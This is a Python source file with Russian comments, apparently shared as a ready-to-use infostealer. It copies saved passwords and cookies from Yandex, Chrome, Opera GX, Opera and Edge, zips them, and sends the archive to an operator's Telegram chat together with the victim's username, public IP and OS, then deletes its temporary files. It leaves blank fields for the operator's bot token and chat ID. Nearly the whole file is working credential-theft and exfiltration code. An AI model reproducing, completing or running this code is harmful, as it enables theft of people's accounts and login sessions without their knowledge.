# -------------------------
# --- created by 1wtsyd ---
# -------------------------

#region Импорты
import datetime
import platform
import tempfile
from threading import Thread
import shutil
import os
import socket
from zipfile import ZipFile
import telebot
import time
import requests
#endregion

TOKEN = "" # Здесь ваш токен.
ID = "" # Ваш айди.

bot = telebot.TeleBot(token=TOKEN) 

def get_ip(): # Получение IP
    try:
        response = requests.get('https://api.ipify.org/')
        return response.text
    except requests.exceptions.RequestException as e:
        return None
def send_file(filePath: str): 
    bot.send_message(chat_id=ID, text=
                           "—————————————————————————————\n"
                        +  f" Имя: {os.getlogin()}\n"
                        +  f" IP:  `{get_ip()}`\n"
                        +  f" Ос:  `{platform.platform()}`\n"
                        +  "—————————————————————————————", parse_mode="Markdown")
    bot.send_document(ID, open(filePath, "rb")) # Отправка файла.
def check_internet(): # Проверка подключения к интернету
    try:
        tg = socket.gethostbyname("https://api.telegram.org/")
        tg.close()
    except:
        exit()

check_internet()
temp_dir = tempfile.mkdtemp()
os.mkdir(temp_dir + "\\report")
username = os.getlogin()

#region Получение куки и паролей с браузеров
# Яндекс Браузер
if os.path.exists('C:\\Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default' % username): # Проверка папки
  os.mkdir('%s\\report\\Yandex' % temp_dir)
  a = 'C:\\Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data' % username # Пароли
  b = '%s\\report\\Yandex\\Ya Passman Data' % temp_dir # Пароли которые будут отправлены
  c = "C:\\Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies" % username # Куки
  d = '%s\\report\\Yandex\\Cookies' % temp_dir # Куки который будут отправлены
  shutil.copyfile (a, b).format # Копирования паролей
  shutil.copyfile (c, d).format # Копирования куки
else:
  pass

# Google Chrome
if os.path.exists('C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default' % username): # Проверка папки
  os.mkdir('%s\\report\\Chrome' % temp_dir)
  a1 = 'C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' % username # Пароли
  b1 = '%s\\report\\Chrome\\Login Data' % temp_dir # Пароли которые будут отправлены
  c1 = "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" % username # Куки
  d1 = '%s\\report\\Chrome\\Cookies' % temp_dir # Куки который будут отправлены
  shutil.copyfile (a1, b1).format # Копирования паролей
  shutil.copyfile (c1, d1).format # Копирования куки
else:
  pass

# Opera GX
if os.path.exists('C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable' % username): #проверка папки с файлами для стиллинга
  os.mkdir('%s\\report\\OperaGX' % temp_dir)
  a2 = 'C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data' % username # Пароли
  b2 = '%s\\report\\OperaGX\\Login Data' % temp_dir # Пароли которые будут отправлены
  c2 = "C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies" % username # Куки
  d2 = '%s\\report\\OperaGX\\Cookies' % temp_dir # Куки который будут отправлены
  shutil.copyfile (a2, b2).format # Копирования паролей
  shutil.copyfile (c2, d2).format # Копирования куки
else:
  pass

# Opera
if os.path.exists('C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera Stable' % username): #проверка папки с файлами для стиллинга
  os.mkdir('%s\\report\\Opera' % temp_dir)
  a3 = 'C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data' % username # Пароли
  b3 = '%s\\report\\Opera\\Login Data' % temp_dir # Пароли которые будут отправлены
  c3 = "C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies" % username # Куки
  d3 = '%s\\report\\Opera\\Cookies' % temp_dir # Куки который будут отправлены
  shutil.copyfile (a3, b3).format # Копирования паролей
  shutil.copyfile (c3, d3).format # Копирования куки
else:
  pass

# Microsoft Edge
if os.path.exists('C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default' % username): #проверка папки с файлами для стиллинга
  os.mkdir('%s\\report\\MicrosoftEdge' % temp_dir)
  a4 = 'C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data' % username # Пароли
  b4 = '%s\\report\\MicrosoftEdge\\Login Data' % temp_dir # Пароли которые будут отправлены
  c4 = "C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies" % username # Куки
  d4 = '%s\\report\\MicrosoftEdge\\Cookies' % temp_dir # Куки который будут отправлены
  shutil.copyfile (a4, b4).format # Копирования паролей
  shutil.copyfile (c4, d4).format # Копирования куки
else:
  pass
#endregion

# Отправка архива
timeUpload = str(datetime.datetime.now().strftime("%H%M%S"))
arcName = f"VV[{username}--{timeUpload}].zip" 
with ZipFile(arcName, "w") as zipfile: 
    for dirname, subdirs, files in os.walk(temp_dir + "\\report\\"):
        zipfile.write(dirname)
        for filename in files:
            zipfile.write(os.path.join(dirname, filename))
    zipfile.close()
shutil.rmtree(fr"{os.path.realpath(temp_dir)}") # Удаляем временую папку

if __name__ == '__main__':
   send_file(arcName)
   os.remove(arcName)
